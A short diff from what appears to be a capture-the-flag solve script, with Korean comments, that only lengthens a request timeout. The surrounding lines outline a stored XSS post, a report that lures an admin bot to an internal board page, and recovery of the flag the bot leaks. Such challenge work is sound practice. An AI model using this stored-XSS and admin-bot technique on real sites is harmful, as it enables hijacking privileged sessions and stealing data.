@@ -73,7 +73,7 @@ def main():
     print("[*] stored XSS post seq=%s  (attacker=%s)" % (seq, uid))
 
     # 3) 내부 보드 뷰를 신고 → admin 봇이 방문/클릭
-    s.post(BASE + "/report", data={"url": "http://10.111.0.4:9090/board/%s" % seq}, timeout=10)
+    s.post(BASE + "/report", data={"url": "http://10.111.0.4:9090/board/%s" % seq}, timeout=30)
     print("[*] reported internal /board/%s → waiting for admin bot ..." % seq)
 
     # 4) 공개 보드 목록에서 봇이 적어낸 flag(제목) 회수
